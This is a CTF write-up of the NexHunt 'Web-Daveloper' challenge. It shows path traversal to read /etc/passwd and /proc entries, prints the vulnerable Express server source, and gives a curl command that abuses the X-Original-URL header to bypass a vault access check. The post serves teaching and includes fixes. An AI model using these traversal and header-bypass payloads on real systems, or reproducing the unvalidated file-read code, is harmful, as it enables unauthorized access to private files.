---
title: "NexHunt: Writeup for Web/Web-Daveloper"
published: 2025-12-13
description: A detailed walkthrough of a web CTF challenge involving LFI
tags: [CTF, Web Security, LFI]
category: Writeups
author: 0xuserm9
---

# Challenge Overview

* CTF: NexHunt CTF 2025
* Challenge: Web-Daveloper
* Category: Web Exploitation
* Points: 100 (28 solves)
>Description: 
i am just a web daveloper, using copilot and chatgbt to create challenges :
>i dont know where is flag.txt , can u find it for me !!!
NOTE: brute forcing is not allowed, you'll be blocked immediatly
Connection Info : http://ctf.nexus-security.club:3555/

>Author: 0xsila X dhia

![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/1.PNG)

---

## Initial Engagement

The challenge presents us with a minimalistic web interface:
![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/challenged.PNG)

The source code (ctrl+U):
```
<html>   
<body>
    
    <h1>Welcome to this easy CTF challenge <!--


        bugbounty >>>>>>>>>>>>>>>>>> CTF
    --></h1>
</body>
</html>
```
---

## Step 1: Testing for Path Traversal

My first instinct is to test for Local File Inclusion (LFI). I tried a classic payload:

![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/2.PNG)

**Bingo!** The server happily returned `/etc/passwd`, revealing the application runs as a node user:
```
node:x:1000:1000::/home/node:/bin/sh
```
**Key Findings:**
 - LFI vulnerability confirmed
 - Application runs as node user
 - Likely a Node.js application
---

## Step 2: Process Information Leakage

Linux's `/proc` filesystem is a goldmine for attackers. I tried accessing process information:
```
GET /../../../proc/self/cwd HTTP/1.1
```
![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/33.PNG)

The error message was more valuable than success:
```
Error: EISDIR: illegal operation on a directory, read
at /app/server.js:114:28
```
**Key Intelligence Gathered:**
 - Application path: `/app`
 - Main file: `server.js`

---

## Step 3: Source Code Disclosure

With the path known, direct source code access was trivial:

![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/4.PNG)

---

## Step 5 — Source Code Analysis

```
const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.text({ type: "*/*" }));

// Base folder where you ALREADY created the files manually
const BASE = path.join(__dirname, "data");

// These folders MUST already exist
const PUBLIC_DIR = path.join(BASE, "public");
const PRIVATE_DIR = path.join(BASE, "vault"); // renamed to be less obvious

// Main handler
app.all("*", (req, res) => {

    const override = req.header("X-HTTP-Method-Override");
    const method = override ? override.toUpperCase() : req.method.toUpperCase();

    const depth = req.header("Depth") || "0";
    const urlPath = req.path === "/" ? "" : req.path;
    const target = path.join(BASE, urlPath);

    // ...

    // ==========================
    // BLOCK direct PROPFIND
    // ==========================
    if (req.method.toUpperCase() === "PROPFIND") {
        return res.status(405).send("method not allowed , yaaaaa9999iiiiiiiiiiwwwwwwwww.");
    }

    // ==========================
    //            GET
    // ==========================
    if (method === "GET") {
        const overrideUrl = req.header("X-Original-URL");

        if (overrideUrl) {
            const realTarget = path.join(BASE, overrideUrl);
            if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
                return res.send(fs.readFileSync(realTarget, "utf8"));
            }
            return res.status(404).send("Not found");
        }

        if (urlPath === "" || urlPath === "/") {
            const indexFile = path.join(PUBLIC_DIR, "index.html");
            if (fs.existsSync(indexFile)) return res.send(fs.readFileSync(indexFile, "utf8"));
            return res.status(404).send("Missing index.html");
        }

        if (!fs.existsSync(target)) return res.status(404).send("Not found");
        if (target.startsWith(PRIVATE_DIR)) return res.status(403).send("Forbidden");
        if (fs.lstatSync(target).isDirectory()) return res.status(400).send("Cannot GET directory");

        // ...
});
```

Important code found:

```js
const BASE = path.join(__dirname, "data");
const PUBLIC_DIR = path.join(BASE, "public");
const PRIVATE_DIR = path.join(BASE, "vault");
```

Directory structure:

```
/app/data/public
/app/data/vault
```

Access to the vault is blocked:

```js
if (target.startsWith(PRIVATE_DIR)) {
  return res.status(403).send("Forbidden");
}
```

---

## Step 6 — Logic Flaw (Trusted Header Abuse)

Another code path:

```js
const overrideUrl = req.header("X-Original-URL");

if (overrideUrl) {
  const realTarget = path.join(BASE, overrideUrl);
  if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
    return res.send(fs.readFileSync(realTarget, "utf8"));
  }
}
```

### Vulnerability
- No validation against `PRIVATE_DIR`
- Blind trust in `X-Original-URL`
- Security check is bypassed

---

## Step 7 — Retrieve the Flag

By sending a safe path and abusing the header:

```http
GET / HTTP/1.1
Host: target
X-Original-URL: /vault/flag.txt
```

Or using curl:

```bash
curl -H "X-Original-URL: /vault/flag.txt" http://target/
```

🎉 The flag is returned.

---

## Lessons Learned

- LFI is often only the entry point
- `/proc` is powerful for reconnaissance
- Stack traces leak sensitive paths
- Never trust headers like `X-Original-URL`
- Security checks must be consistent

---

## How to Fix

- Normalize and validate all file paths
- Apply access control on every read path
- Disable stack traces in production
- Do not trust proxy headers blindly

---

## Conclusion

This challenge demonstrates how chaining small vulnerabilities can lead to full compromise.  
No brute force, no fuzzing — only logic.

Happy hacking 🏴‍☠️
